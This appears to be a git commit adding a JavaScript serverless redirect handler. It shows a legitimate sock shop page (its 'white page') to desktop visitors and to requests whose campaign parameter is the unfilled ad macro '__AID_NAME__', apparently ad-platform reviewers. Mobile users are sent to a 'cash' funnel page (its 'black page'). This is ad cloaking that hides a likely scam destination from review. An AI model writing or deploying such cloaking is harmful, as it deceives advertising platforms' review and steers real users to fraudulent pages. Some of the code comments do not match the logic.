d0b997852c7eb07854b0589d6731ae2391bc12f0
madison38248 <madison38248@gmail.com>
2025-01-15 13:37:31 +0500

    Add files via upload

---
+++ api/redirect.js
@@ -0,0 +1,27 @@
+export default function handler(req, res) {
+    // URLs to redirect
+    const whitePageURL = "https://www.peoplesocks.com/collections/featured-products/products/everyday-merino-tabsocks";
+    const blackPageURL = "https://VXAJXfDwZd.myfunnelish.com/cash-1735686017557538";
+  
+    // Parse the UTM parameters from the request URL
+    const queryParams = new URLSearchParams(req.url.split('?')[1]);
+    const utmCampaign = queryParams.get('utm_campaign');
+  
+    // Get the User-Agent from the request headers
+    const userAgent = req.headers['user-agent'] || '';
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+  
+    // Redirection logic
+    if (utmCampaign === '__AID_NAME__') {
+      // UTM campaign 'l1' takes priority for both desktop and mobile
+      res.writeHead(302, { Location: whitePageURL });
+    } else if (isMobileDevice) {
+      // Mobile devices without 'l1' campaign
+      res.writeHead(302, { Location: blackPageURL });
+    } else {
+      // Desktop devices without 'l1' campaign
+      res.writeHead(302, { Location: whitePageURL });
+    }
+  
+    res.end();
+  }
